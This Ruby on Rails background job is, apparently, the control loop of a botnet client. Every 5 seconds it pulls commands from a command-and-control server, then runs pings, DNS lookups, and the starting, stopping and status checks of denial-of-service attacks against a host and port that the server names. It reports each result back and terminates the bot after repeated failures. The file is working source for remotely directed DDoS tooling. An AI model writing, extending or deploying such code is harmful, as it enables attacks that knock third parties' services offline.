class ClientControlJob < ApplicationJob
  queue_as :client

  include CommandsHelper
  include PingsHelper
  include DosHelper
  include DnsHelper

  rescue_from(StandardError) do |exception|
    cc_log(exception)

    if exception.is_a?(CustomError) && exception.fatal_error?
      terminate_bot
      return
    end

    counter = Parameter.client_c_fails_counter + 1
    if counter >= 3
      terminate_bot
      return
    end

    Parameter.custom_update('client_c_fails_counter', counter)
    ClientControlJob.set(wait: 5.seconds).perform_later
  end

  def perform(*args)
    if args.present? && args.first[:start]
      result = echo
      raise result if result.is_a?(CustomError)

      cc_log('Interface deployed and synced with client cc')
      Parameter.custom_update('client_c_interface_deploy', true)
    else
      pull_client_c
    end

    ClientControlJob.set(wait: 5.seconds).perform_later
  end

  private

  def pull_client_c
    success = true
    commands = pull_command
    cc_log("cc[debug][commands]: Receiving => #{commands}")
    return if commands.blank?

    result = nil
    commands = commands.with_indifferent_access
    case commands['type']
    when 'ping'
      result = start_ping(host_target: commands['host_target'], port: commands['port'] || nil, timeout: 5, type: commands['type_2'])

    when 'dns'
      result = nslookup_for(commands['host_target'])

    when 'dos'
      case commands['type_2']
      when 'dos_start'

        if !Parameter.dos_active
          begin
            DosJob.perform_now({host_target: commands['host_target'], port: commands['port'], type: commands['type_3']})
            Parameter.find_by(code: 'dos_active').update(value: 'true')
            message = 'Dos schedule to run'
          rescue StandardError => e
            cc_log(e.to_s + e.backtrace.take(10).to_s)
            message = 'Cannot schedule a Dos due to the existence of an on going'
            success = false
          end
        else
          message = 'Cannot schedule a Dos due to the existence of an on going'
          success = false
        end

      when 'dos_stop'
        Delayed::Job.where(queue: 'client_dos').delete_all
        sleep(0.2)
        Delayed::Job.where(queue: 'client_dos').delete_all

        Parameter.find_by(code: 'dos_active').update(value: 'false')
        message = 'DOS stop'

      when 'dos_status'
        status = 'OFF'
        meta_host = 'none'
        meta_port = 'none'
        if Parameter.dos_active
          status = 'ON'
          job = Delayed::Job.where(queue: 'client_dos').first
          meta = YAML.load(job.handler, permitted_classes: [ActiveJob::QueueAdapters::DelayedJobAdapter::JobWrapper])
          meta_host = meta.job_data['arguments'].first['host_target']
          meta_port = meta.job_data['arguments'].first['port'].present? ? meta.job_data['arguments'].first['port'] : 'unspecified'
        end

        message = "DOS is #{status} and striking to host: #{meta_host} at port #{meta_port}"

      else
        raise CustomError.new(msg: 'Invalid Option')

      end

      result = custom_out(success: success, result: message)
    end

    if result.is_a?(CustomError)
      report_result = report_activity(identifier: commands['id'], error_code: result.code, error_msg: result.msg)
    else
      report_result = report_activity(success: success, identifier: commands['id'], action: commands['action'], result: result)
    end

    raise report_result if report_result.is_a?(CustomError)
  end
end
